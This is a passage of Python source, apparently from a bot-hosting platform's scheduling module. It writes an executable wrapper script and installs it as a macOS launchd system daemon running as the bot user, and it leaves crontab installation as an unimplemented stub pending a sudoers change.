    try:
        scheduled_dir.mkdir(parents=True, exist_ok=True)
        log_dir.mkdir(parents=True, exist_ok=True)
        fd, tmp = tempfile.mkstemp(
            dir=str(scheduled_dir),
            prefix=f".{action_id}-",
            suffix=".py",
        )
        with os.fdopen(fd, "w") as f:
            f.write(wrapper_body)
        os.chmod(tmp, 0o755)  # launchd needs to exec the wrapper
        os.replace(tmp, wrapper_path)
    except (PermissionError, OSError) as exc:
        return _err(f"could not write wrapper {wrapper_path}: {exc}")

    # Render + install the plist as a system LaunchDaemon. Bot users on
    # an Evolve pod are service accounts (no GUI session), so the legacy
    # gui/{uid} bootstrap path used by install_launch_agent fails; the
    # system domain is always available and respects the UserName key
    # we embed below to keep the daemon running as the bot user.
    try:
        plist_xml = _build_plist_xml(
            label=label,
            wrapper_path=str(wrapper_path),
            schedule=schedule,
            log_path=str(log_path),
            err_log_path=str(err_log_path),
            user_name=bot_user,
            group_name="staff",
        )
    except ValueError as exc:
        return _err(f"could not render plist: {exc}")

    la_result = install_launchd_system_daemon(
        bot_id, label, plist_xml,
        network=net, bootstrap=bootstrap,
    )
    if not la_result.get("ok"):
        # Wrapper landed but plist didn't — surface the plist error so
        # the operator can fix it without losing the wrapper.
        return _err(
            "wrapper written but plist install failed: "
            + (la_result.get("error") or "(unknown)"),
            wrapper_path=str(wrapper_path),
        )

    plist_path = la_result.get("artifact", "")
    return _ok(
        f"{plist_path}+{wrapper_path}",
        wrapper_path=str(wrapper_path),
        plist_path=plist_path,
        loaded=la_result.get("loaded", False),
    )


# ── crontab install — deferred ──────────────────────────────────────────────


def install_crontab_entry(
    bot_id: str,
    schedule: str,
    command: str,
    label: str,
    **kwargs: Any,
) -> dict:
    """NOT IMPLEMENTED — see module docstring.

    The evolve user has no ``sudo -u <bot> crontab`` grant; adding one
    needs an /etc/sudoers.d/evolve edit. Spec §4.1 lists crontab as a
    legacy mechanism (LaunchAgent or OC hooks preferred), so this is
    deferred to a follow-up PR with the sudoers change.
    """
    return _err(
        "crontab install not implemented in PR 4 — needs sudoers grant "
        "for `evolve` to run `sudo -u <bot> crontab`. Use oc_heartbeat_hook "
        "or launchd mechanism instead. See spec-forge-side-effects §4.1."
    )
